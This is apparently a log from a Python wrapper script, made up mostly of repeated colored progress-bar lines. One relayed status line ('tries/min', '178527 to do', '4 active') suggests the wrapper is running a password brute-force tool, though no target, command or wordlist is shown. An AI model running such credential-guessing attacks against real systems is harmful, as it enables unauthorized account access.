2025-10-24 01:34:08,525 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m5.1%[0m ETA: 284.8s Speed: 29 B/s | 15.2s | PID: 44124
2025-10-24 01:34:09,334 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m5.3%[0m ETA: 284.0s Speed: 27 B/s | 16.0s | PID: 44124
2025-10-24 01:34:10,136 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m5.6%[0m ETA: 283.2s Speed: 26 B/s | 16.8s | PID: 44124
2025-10-24 01:34:10,936 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m5.9%[0m ETA: 282.4s Speed: 25 B/s | 17.6s | PID: 44124
2025-10-24 01:34:11,738 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m6.1%[0m ETA: 281.6s Speed: 24 B/s | 18.4s | PID: 44124
2025-10-24 01:34:12,548 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m6.4%[0m ETA: 280.8s Speed: 23 B/s | 19.2s | PID: 44124
2025-10-24 01:34:13,354 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m6.7%[0m ETA: 280.0s Speed: 22 B/s | 20.0s | PID: 44124
2025-10-24 01:34:14,157 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m6.9%[0m ETA: 279.2s Speed: 21 B/s | 20.8s | PID: 44124
2025-10-24 01:34:14,960 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m7.2%[0m ETA: 278.3s Speed: 20 B/s | 21.7s | PID: 44124
2025-10-24 01:34:15,762 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m7.5%[0m ETA: 277.5s Speed: 20 B/s | 22.5s | PID: 44124
2025-10-24 01:34:16,564 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m7.8%[0m ETA: 276.7s Speed: 19 B/s | 23.3s | PID: 44124
2025-10-24 01:34:17,367 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m8.0%[0m ETA: 275.9s Speed: 18 B/s | 24.1s | PID: 44124
2025-10-24 01:34:18,168 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m8.3%[0m ETA: 275.1s Speed: 18 B/s | 24.9s | PID: 44124
2025-10-24 01:34:18,970 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m8.6%[0m ETA: 274.3s Speed: 17 B/s | 25.7s | PID: 44124
2025-10-24 01:34:19,771 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m8.8%[0m ETA: 273.5s Speed: 17 B/s | 26.5s | PID: 44124
2025-10-24 01:34:20,572 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m9.1%[0m ETA: 272.7s Speed: 16 B/s | 27.3s | PID: 44124
2025-10-24 01:34:21,372 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m9.4%[0m ETA: 271.9s Speed: 16 B/s | 28.1s | PID: 44124
2025-10-24 01:34:22,173 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m9.6%[0m ETA: 271.1s Speed: 15 B/s | 28.9s | PID: 44124
2025-10-24 01:34:22,976 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m9.9%[0m ETA: 270.3s Speed: 15 B/s | 29.7s | PID: 44124
2025-10-24 01:34:23,776 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m10.2%[0m ETA: 269.5s Speed: 14 B/s | 30.5s | PID: 44124
2025-10-24 01:34:24,577 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m10.4%[0m ETA: 268.7s Speed: 14 B/s | 31.3s | PID: 44124
2025-10-24 01:34:25,378 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m10.7%[0m ETA: 267.9s Speed: 14 B/s | 32.1s | PID: 44124
2025-10-24 01:34:26,179 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m11.0%[0m ETA: 267.1s Speed: 13 B/s | 32.9s | PID: 44124
2025-10-24 01:34:26,981 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m11.2%[0m ETA: 266.3s Speed: 13 B/s | 33.7s | PID: 44124
2025-10-24 01:34:27,783 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m11.5%[0m ETA: 265.5s Speed: 13 B/s | 34.5s | PID: 44124
2025-10-24 01:34:28,583 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m11.8%[0m ETA: 264.7s Speed: 12 B/s | 35.3s | PID: 44124
2025-10-24 01:34:29,384 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m12.0%[0m ETA: 263.9s Speed: 12 B/s | 36.1s | PID: 44124
2025-10-24 01:34:30,185 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m12.3%[0m ETA: 263.1s Speed: 12 B/s | 36.9s | PID: 44124
2025-10-24 01:34:30,986 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m12.6%[0m ETA: 262.3s Speed: 12 B/s | 37.7s | PID: 44124
2025-10-24 01:34:31,787 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m12.8%[0m ETA: 261.5s Speed: 11 B/s | 38.5s | PID: 44124
2025-10-24 01:34:32,587 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m13.1%[0m ETA: 260.7s Speed: 11 B/s | 39.3s | PID: 44124
2025-10-24 01:34:33,388 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m13.4%[0m ETA: 259.9s Speed: 11 B/s | 40.1s | PID: 44124
2025-10-24 01:34:34,188 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m13.6%[0m ETA: 259.1s Speed: 11 B/s | 40.9s | PID: 44124
2025-10-24 01:34:34,989 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m13.9%[0m ETA: 258.3s Speed: 11 B/s | 41.7s | PID: 44124
2025-10-24 01:34:35,789 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m14.2%[0m ETA: 257.5s Speed: 10 B/s | 42.5s | PID: 44124
2025-10-24 01:34:36,590 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m14.4%[0m ETA: 256.7s Speed: 10 B/s | 43.3s | PID: 44124
2025-10-24 01:34:37,391 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m14.7%[0m ETA: 255.9s Speed: 10 B/s | 44.1s | PID: 44124
2025-10-24 01:34:38,194 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m15.0%[0m ETA: 255.1s Speed: 10 B/s | 44.9s | PID: 44124
2025-10-24 01:34:38,996 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m15.2%[0m ETA: 254.3s Speed: 10 B/s | 45.7s | PID: 44124
2025-10-24 01:34:39,796 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m15.5%[0m ETA: 253.5s Speed: 9 B/s | 46.5s | PID: 44124
2025-10-24 01:34:40,597 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m15.8%[0m ETA: 252.7s Speed: 9 B/s | 47.3s | PID: 44124
2025-10-24 01:34:41,399 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m16.0%[0m ETA: 251.9s Speed: 9 B/s | 48.1s | PID: 44124
2025-10-24 01:34:42,200 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m16.3%[0m ETA: 251.1s Speed: 9 B/s | 48.9s | PID: 44124
2025-10-24 01:34:43,001 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m16.6%[0m ETA: 250.3s Speed: 9 B/s | 49.7s | PID: 44124
2025-10-24 01:34:43,802 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m16.8%[0m ETA: 249.5s Speed: 9 B/s | 50.5s | PID: 44124
2025-10-24 01:34:44,602 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m17.1%[0m ETA: 248.7s Speed: 9 B/s | 51.3s | PID: 44124
2025-10-24 01:34:45,404 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m17.4%[0m ETA: 247.9s Speed: 8 B/s | 52.1s | PID: 44124
2025-10-24 01:34:46,208 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m17.6%[0m ETA: 247.1s Speed: 8 B/s | 52.9s | PID: 44124
2025-10-24 01:34:47,009 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m17.9%[0m ETA: 246.3s Speed: 8 B/s | 53.7s | PID: 44124
2025-10-24 01:34:47,810 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m18.2%[0m ETA: 245.5s Speed: 8 B/s | 54.5s | PID: 44124
2025-10-24 01:34:48,611 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m18.4%[0m ETA: 244.7s Speed: 8 B/s | 55.3s | PID: 44124
2025-10-24 01:34:49,411 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m18.7%[0m ETA: 243.9s Speed: 8 B/s | 56.1s | PID: 44124
2025-10-24 01:34:50,212 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m19.0%[0m ETA: 243.1s Speed: 8 B/s | 56.9s | PID: 44124
2025-10-24 01:34:51,012 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m19.2%[0m ETA: 242.3s Speed: 8 B/s | 57.7s | PID: 44124
2025-10-24 01:34:51,813 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m19.5%[0m ETA: 241.5s Speed: 8 B/s | 58.5s | PID: 44124
2025-10-24 01:34:52,614 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m19.8%[0m ETA: 240.7s Speed: 7 B/s | 59.3s | PID: 44124
2025-10-24 01:34:53,010 - __main__ - INFO - 📤 STDOUT: [STATUS] 148.00 tries/min, 148 tries in 00:01h, 178527 to do in 20:07h, 4 active
2025-10-24 01:34:53,416 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m20.0%[0m ETA: 239.9s Speed: 9 B/s | 60.1s | PID: 44124
2025-10-24 01:34:54,219 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m20.3%[0m ETA: 239.1s Speed: 9 B/s | 60.9s | PID: 44124
2025-10-24 01:34:55,020 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m20.6%[0m ETA: 238.3s Speed: 8 B/s | 61.7s | PID: 44124
2025-10-24 01:34:55,822 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m20.8%[0m ETA: 237.5s Speed: 8 B/s | 62.5s | PID: 44124
2025-10-24 01:34:56,629 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m21.1%[0m ETA: 236.7s Speed: 8 B/s | 63.3s | PID: 44124
2025-10-24 01:34:57,431 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m21.4%[0m ETA: 235.9s Speed: 8 B/s | 64.1s | PID: 44124
2025-10-24 01:34:58,232 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m21.6%[0m ETA: 235.1s Speed: 8 B/s | 64.9s | PID: 44124
2025-10-24 01:34:59,032 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m21.9%[0m ETA: 234.3s Speed: 8 B/s | 65.7s | PID: 44124
2025-10-24 01:34:59,833 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m22.2%[0m ETA: 233.5s Speed: 8 B/s | 66.5s | PID: 44124
2025-10-24 01:35:00,634 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m22.4%[0m ETA: 232.7s Speed: 8 B/s | 67.3s | PID: 44124
2025-10-24 01:35:01,434 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m22.7%[0m ETA: 231.9s Speed: 8 B/s | 68.1s | PID: 44124
2025-10-24 01:35:02,240 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m23.0%[0m ETA: 231.1s Speed: 8 B/s | 68.9s | PID: 44124
2025-10-24 01:35:03,042 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m23.2%[0m ETA: 230.3s Speed: 7 B/s | 69.7s | PID: 44124
2025-10-24 01:35:03,843 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m23.5%[0m ETA: 229.5s Speed: 7 B/s | 70.5s | PID: 44124
2025-10-24 01:35:04,644 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m23.8%[0m ETA: 228.7s Speed: 7 B/s | 71.3s | PID: 44124
2025-10-24 01:35:05,445 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m24.0%[0m ETA: 227.9s Speed: 7 B/s | 72.1s | PID: 44124
2025-10-24 01:35:06,245 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m24.3%[0m ETA: 227.1s Speed: 7 B/s | 72.9s | PID: 44124
2025-10-24 01:35:07,046 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m24.6%[0m ETA: 226.3s Speed: 7 B/s | 73.7s | PID: 44124
2025-10-24 01:35:07,852 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m24.8%[0m ETA: 225.5s Speed: 7 B/s | 74.5s | PID: 44124
2025-10-24 01:35:08,653 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m25.1%[0m ETA: 224.7s Speed: 7 B/s | 75.3s | PID: 44124
2025-10-24 01:35:09,453 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m25.4%[0m ETA: 223.9s Speed: 7 B/s | 76.1s | PID: 44124
2025-10-24 01:35:10,254 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m25.6%[0m ETA: 223.1s Speed: 7 B/s | 76.9s | PID: 44124
2025-10-24 01:35:11,054 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m25.9%[0m ETA: 222.3s Speed: 7 B/s | 77.7s | PID: 44124
2025-10-24 01:35:11,855 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m26.2%[0m ETA: 221.5s Speed: 7 B/s | 78.5s | PID: 44124
2025-10-24 01:35:12,656 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m26.4%[0m ETA: 220.7s Speed: 7 B/s | 79.3s | PID: 44124
2025-10-24 01:35:13,458 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m26.7%[0m ETA: 219.9s Speed: 7 B/s | 80.1s | PID: 44124
2025-10-24 01:35:14,258 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m27.0%[0m ETA: 219.1s Speed: 6 B/s | 80.9s | PID: 44124
2025-10-24 01:35:15,059 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m27.2%[0m ETA: 218.3s Speed: 6 B/s | 81.7s | PID: 44124
2025-10-24 01:35:15,860 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m27.5%[0m ETA: 217.4s Speed: 6 B/s | 82.6s | PID: 44124
2025-10-24 01:35:16,667 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m27.8%[0m ETA: 216.6s Speed: 6 B/s | 83.4s | PID: 44124
2025-10-24 01:35:17,468 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m28.1%[0m ETA: 215.8s Speed: 6 B/s | 84.2s | PID: 44124
2025-10-24 01:35:18,272 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m28.3%[0m ETA: 215.0s Speed: 6 B/s | 85.0s | PID: 44124
2025-10-24 01:35:19,072 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m28.6%[0m ETA: 214.2s Speed: 6 B/s | 85.8s | PID: 44124
2025-10-24 01:35:19,873 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m28.9%[0m ETA: 213.4s Speed: 6 B/s | 86.6s | PID: 44124
2025-10-24 01:35:20,675 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m29.1%[0m ETA: 212.6s Speed: 6 B/s | 87.4s | PID: 44124
2025-10-24 01:35:21,475 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m29.4%[0m ETA: 211.8s Speed: 6 B/s | 88.2s | PID: 44124
2025-10-24 01:35:22,278 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m29.7%[0m ETA: 211.0s Speed: 6 B/s | 89.0s | PID: 44124
2025-10-24 01:35:23,079 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m29.9%[0m ETA: 210.2s Speed: 6 B/s | 89.8s | PID: 44124
2025-10-24 01:35:23,880 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m30.2%[0m ETA: 209.4s Speed: 6 B/s | 90.6s | PID: 44124
2025-10-24 01:35:24,680 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m30.5%[0m ETA: 208.6s Speed: 6 B/s | 91.4s | PID: 44124
2025-10-24 01:35:25,482 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m30.7%[0m ETA: 207.8s Speed: 6 B/s | 92.2s | PID: 44124
2025-10-24 01:35:26,283 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m31.0%[0m ETA: 207.0s Speed: 6 B/s | 93.0s | PID: 44124
2025-10-24 01:35:27,084 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m31.3%[0m ETA: 206.2s Speed: 6 B/s | 93.8s | PID: 44124
2025-10-24 01:35:27,884 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m31.5%[0m ETA: 205.4s Speed: 6 B/s | 94.6s | PID: 44124
2025-10-24 01:35:28,685 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m31.8%[0m ETA: 204.6s Speed: 5 B/s | 95.4s | PID: 44124
2025-10-24 01:35:29,486 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m32.1%[0m ETA: 203.8s Speed: 5 B/s | 96.2s | PID: 44124
2025-10-24 01:35:30,288 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m32.3%[0m ETA: 203.0s Speed: 5 B/s | 97.0s | PID: 44124
2025-10-24 01:35:31,089 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m32.6%[0m ETA: 202.2s Speed: 5 B/s | 97.8s | PID: 44124
2025-10-24 01:35:31,890 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m32.9%[0m ETA: 201.4s Speed: 5 B/s | 98.6s | PID: 44124
2025-10-24 01:35:32,690 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m33.1%[0m ETA: 200.6s Speed: 5 B/s | 99.4s | PID: 44124
2025-10-24 01:35:33,491 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m33.4%[0m ETA: 199.8s Speed: 5 B/s | 100.2s | PID: 44124
2025-10-24 01:35:34,292 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m33.7%[0m ETA: 199.0s Speed: 5 B/s | 101.0s | PID: 44124
2025-10-24 01:35:35,092 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m33.9%[0m ETA: 198.2s Speed: 5 B/s | 101.8s | PID: 44124
2025-10-24 01:35:35,896 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m34.2%[0m ETA: 197.4s Speed: 5 B/s | 102.6s | PID: 44124
2025-10-24 01:35:36,699 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m34.5%[0m ETA: 196.6s Speed: 5 B/s | 103.4s | PID: 44124
